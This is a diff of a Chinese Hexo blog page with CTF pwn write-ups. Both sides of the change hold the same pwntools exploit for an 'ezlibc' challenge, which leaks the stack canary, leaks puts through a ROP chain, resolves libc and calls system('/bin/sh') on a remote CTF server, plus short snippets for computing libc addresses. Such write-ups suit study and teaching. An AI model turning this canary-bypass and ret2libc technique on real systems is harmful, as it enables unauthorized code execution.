 <h1 id="6-NSSCTF-2022-Spring-Recruit-R3m4ke"><a href="#6-NSSCTF-2022-Spring-Recruit-R3m4ke" class="headerlink" title="6.[NSSCTF 2022 Spring Recruit]R3m4ke?"></a>6.[NSSCTF 2022 Spring Recruit]R3m4ke?</h1><p>checksec查看<img src="/2025/01/19/wp/wps7.jpg" alt="img"></p>
@@ -682,11 +811,11 @@
 <p>2.根据基地址&#x3D;真实地址-偏移地址</p>
 <p>3.根据真实地址&#x3D;基地址+偏移地址算出system函数和”&#x2F;bin&#x2F;sh”字符串的真实地址</p>
 <p>4.构造payload2，劫持程序，拿到shell</p>
-<h1 id="exp以及解释"><a href="#exp以及解释" class="headerlink" title="exp以及解释"></a>exp以及解释</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>io=process(<span class="hljs-string">&#x27;./ezlibc&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&quot;./ezlibc&quot;</span>)<br>io=remote(<span class="hljs-string">&#x27;xlctf.huhstsec.top&#x27;</span>,<span class="hljs-number">40657</span>)<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#payload1:泄露canary</span><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">0x8</span>)+<span class="hljs-string">b&#x27;b&#x27;</span>                                 <span class="hljs-comment">#多发送一个b来覆盖canary的\x00</span><br>io.recvuntil(<span class="hljs-string">b&#x27;flag!&#x27;</span>)<br>io.send(payload1);                                            <span class="hljs-comment">#这里不能用sendline，因为回车会占字节</span><br>io.recvuntil(<span class="hljs-string">b&#x27;ab&#x27;</span>)                                           <span class="hljs-comment">#定位到Canary之前</span><br>canary=u64(<span class="hljs-string">b&#x27;\x00&#x27;</span>+io.recv(<span class="hljs-number">7</span>))                                <span class="hljs-comment">#接受canary将\x00重新填上，再接受7个字节，并转换为64位</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;canary:&#x27;</span>,<span class="hljs-built_in">hex</span>(canary))<br>pop_rdi_ret_addr=<span class="hljs-number">0x400843</span><br>ret_addr=<span class="hljs-number">0x000000000040059e</span>               <br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]                                      <span class="hljs-comment">#查找puts函数plt表的地址</span><br>main_addr=<span class="hljs-number">0x4006e7</span><br>puts_got=elf.got[<span class="hljs-string">&quot;puts&quot;</span>]                                      <span class="hljs-comment">#查找puts函数got表的地址</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_plt:&quot;</span>,<span class="hljs-built_in">hex</span>(puts_plt))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;plt_got:&quot;</span>,<span class="hljs-built_in">hex</span>(puts_got))<br><br><span class="hljs-comment">#payload2:泄露puts真实地址</span><br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>)+p64(canary)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>                     <span class="hljs-comment">#先覆盖到到canary之前，再将canary发送</span><br>payload2+=p64(pop_rdi_ret_addr)+p64(puts_got)                 <span class="hljs-comment">#将puts函数got表的地址储存在寄存器rdi里  </span><br>payload2+=p64(puts_plt)                                       <span class="hljs-comment">#调用puts函数</span><br>payload2+=p64(main_addr)                                      <span class="hljs-comment">#最后返回到main，再次进行栈溢出  </span><br>io.recvuntil(<span class="hljs-string">b&quot;Maybe UR closer to the key&quot;</span>)                     <br>io.sendline(payload2)<br>puts_addr = u64(io.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))  <span class="hljs-comment">#接收puts函数的真实地址，从7f开始接收，长度补足8个字节</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;real addr:&quot;</span>,<span class="hljs-built_in">hex</span>(puts_addr))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)                           <span class="hljs-comment">#查询libc版本</span><br>base=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)                              <span class="hljs-comment">#计算基地址</span><br>system=base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)                               <span class="hljs-comment">#计算system函数地址</span><br>bin_sh=base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)                           <span class="hljs-comment">#计算/bin/sh字符串地址</span><br><br><br><span class="hljs-comment">#payload3：构造调用system(&quot;/bin/sh&quot;)</span><br>payload3=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>)+p64(canary)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>      <br>payload3+=p64(ret_addr)                                       <span class="hljs-comment">#栈平衡</span><br>payload3+=p64(pop_rdi_ret_addr)+p64(bin_sh)                   <span class="hljs-comment">#将/bin/sh的地址储存在rdi寄存器中</span><br>payload3+=p64(system)<br>io.sendline(payload3)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<h1 id="exp以及解释"><a href="#exp以及解释" class="headerlink" title="exp以及解释"></a>exp以及解释</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">io=process(&#x27;./ezlibc&#x27;)</span><br><span class="line">elf=ELF(&quot;./ezlibc&quot;)</span><br><span class="line">io=remote(&#x27;xlctf.huhstsec.top&#x27;,40657)</span><br><span class="line">context(arch=&quot;amd64&quot;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#payload1:泄露canary</span><br><span class="line">payload1=b&#x27;a&#x27;*(0x30-0x8)+b&#x27;b&#x27;                                 #多发送一个b来覆盖canary的\x00</span><br><span class="line">io.recvuntil(b&#x27;flag!&#x27;)</span><br><span class="line">io.send(payload1);                                            #这里不能用sendline，因为回车会占字节</span><br><span class="line">io.recvuntil(b&#x27;ab&#x27;)                                           #定位到Canary之前</span><br><span class="line">canary=u64(b&#x27;\x00&#x27;+io.recv(7))                                #接受canary将\x00重新填上，再接受7个字节，并转换为64位</span><br><span class="line">print(&#x27;canary:&#x27;,hex(canary))</span><br><span class="line">pop_rdi_ret_addr=0x400843</span><br><span class="line">ret_addr=0x000000000040059e               </span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]                                      #查找puts函数plt表的地址</span><br><span class="line">main_addr=0x4006e7</span><br><span class="line">puts_got=elf.got[&quot;puts&quot;]                                      #查找puts函数got表的地址</span><br><span class="line">print(&quot;puts_plt:&quot;,hex(puts_plt))</span><br><span class="line">print(&quot;plt_got:&quot;,hex(puts_got))</span><br><span class="line"></span><br><span class="line">#payload2:泄露puts真实地址</span><br><span class="line">payload2=b&#x27;a&#x27;*(0x30-8)+p64(canary)+b&#x27;a&#x27;*8                     #先覆盖到到canary之前，再将canary发送</span><br><span class="line">payload2+=p64(pop_rdi_ret_addr)+p64(puts_got)                 #将puts函数got表的地址储存在寄存器rdi里  </span><br><span class="line">payload2+=p64(puts_plt)                                       #调用puts函数</span><br><span class="line">payload2+=p64(main_addr)                                      #最后返回到main，再次进行栈溢出  </span><br><span class="line">io.recvuntil(b&quot;Maybe UR closer to the key&quot;)                     </span><br><span class="line">io.sendline(payload2)</span><br><span class="line">puts_addr = u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))  #接收puts函数的真实地址，从7f开始接收，长度补足8个字节</span><br><span class="line">print(&quot;real addr:&quot;,hex(puts_addr))</span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)                           #查询libc版本</span><br><span class="line">base=puts_addr-libc.dump(&#x27;puts&#x27;)                              #计算基地址</span><br><span class="line">system=base+libc.dump(&#x27;system&#x27;)                               #计算system函数地址</span><br><span class="line">bin_sh=base+libc.dump(&#x27;str_bin_sh&#x27;)                           #计算/bin/sh字符串地址</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#payload3：构造调用system(&quot;/bin/sh&quot;)</span><br><span class="line">payload3=b&#x27;a&#x27;*(0x30-8)+p64(canary)+b&#x27;a&#x27;*8      </span><br><span class="line">payload3+=p64(ret_addr)                                       #栈平衡</span><br><span class="line">payload3+=p64(pop_rdi_ret_addr)+p64(bin_sh)                   #将/bin/sh的地址储存在rdi寄存器中</span><br><span class="line">payload3+=p64(system)</span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<h1 id="最后题目为我们提供Libc版本-so文件-与-不提供的区别"><a href="#最后题目为我们提供Libc版本-so文件-与-不提供的区别" class="headerlink" title="最后题目为我们提供Libc版本.so文件, 与 不提供的区别"></a>最后题目为我们提供Libc版本.so文件, 与 不提供的区别</h1><h2 id="（1）当题目不提供libc-so文件我们就需要借助LibcSearche库"><a href="#（1）当题目不提供libc-so文件我们就需要借助LibcSearche库" class="headerlink" title="（1）当题目不提供libc.so文件我们就需要借助LibcSearche库"></a>（1）当题目不提供libc.so文件我们就需要借助LibcSearche库</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)  <br>base=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)                              #计算基地址<br><span class="hljs-keyword">system</span>=base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)                               #计算<span class="hljs-keyword">system</span>函数地址<br>bin_sh=base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)                           #计算/bin/sh字符串地址<br></code></pre></td></tr></table></figure>
+<h1 id="最后题目为我们提供Libc版本-so文件-与-不提供的区别"><a href="#最后题目为我们提供Libc版本-so文件-与-不提供的区别" class="headerlink" title="最后题目为我们提供Libc版本.so文件, 与 不提供的区别"></a>最后题目为我们提供Libc版本.so文件, 与 不提供的区别</h1><h2 id="（1）当题目不提供libc-so文件我们就需要借助LibcSearche库"><a href="#（1）当题目不提供libc-so文件我们就需要借助LibcSearche库" class="headerlink" title="（1）当题目不提供libc.so文件我们就需要借助LibcSearche库"></a>（1）当题目不提供libc.so文件我们就需要借助LibcSearche库</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from LibcSearcher import *</span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)  </span><br><span class="line">base=puts_addr-libc.dump(&#x27;puts&#x27;)                              #计算基地址</span><br><span class="line">system=base+libc.dump(&#x27;system&#x27;)                               #计算system函数地址</span><br><span class="line">bin_sh=base+libc.dump(&#x27;str_bin_sh&#x27;)                           #计算/bin/sh字符串地址</span><br></pre></td></tr></table></figure>
 
-<h2 id="2-当题目提供libc-so文件"><a href="#2-当题目提供libc-so文件" class="headerlink" title="(2)当题目提供libc.so文件"></a>(2)当题目提供libc.so文件</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">libc</span>=ELF(<span class="hljs-string">&#x27;libc-2.23.so&#x27;</span>)<br><span class="hljs-attr">base</span>=puts_addr-libc.sym(<span class="hljs-string">&#x27;puts&#x27;</span>)                              <span class="hljs-comment">#计算基地址</span><br><span class="hljs-attr">system</span>=base+libc.sym(<span class="hljs-string">&#x27;system&#x27;</span>)                               <span class="hljs-comment">#计算system函数地址</span><br><span class="hljs-attr">bin_sh</span>=base+libc.sym(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)                           <span class="hljs-comment">#计算/bin/sh字符串地址</span><br></code></pre></td></tr></table></figure>
+<h2 id="2-当题目提供libc-so文件"><a href="#2-当题目提供libc-so文件" class="headerlink" title="(2)当题目提供libc.so文件"></a>(2)当题目提供libc.so文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc=ELF(&#x27;libc-2.23.so&#x27;)</span><br><span class="line">base=puts_addr-libc.sym(&#x27;puts&#x27;)                              #计算基地址</span><br><span class="line">system=base+libc.sym(&#x27;system&#x27;)                               #计算system函数地址</span><br><span class="line">bin_sh=base+libc.sym(&#x27;str_bin_sh&#x27;)                           #计算/bin/sh字符串地址</span><br></pre></td></tr></table></figure>
 
 <h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p>canary：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43713800/article/details/105273284">canary介绍与绕过技巧_金丝雀漏洞缓解-CSDN博客</a></p>
 <p>​	      <a target="_blank" rel="noopener" href="https://blog.csdn.net/wangxunyu6/article/details/135682410">pwn入门之canary保护_pwn canary-CSDN博客</a></p>
@@ -1120,16 +1249,16 @@
 
       
           <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
 
 <p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
 
 <p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
 
 <p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 
 <p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 
@@ -1213,7 +1342,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">7</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1263,13 +1392,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">12k</span>
+    <span title="站点总字数">14k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">11 分钟</span>
+    <span title="站点阅读时长">12 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
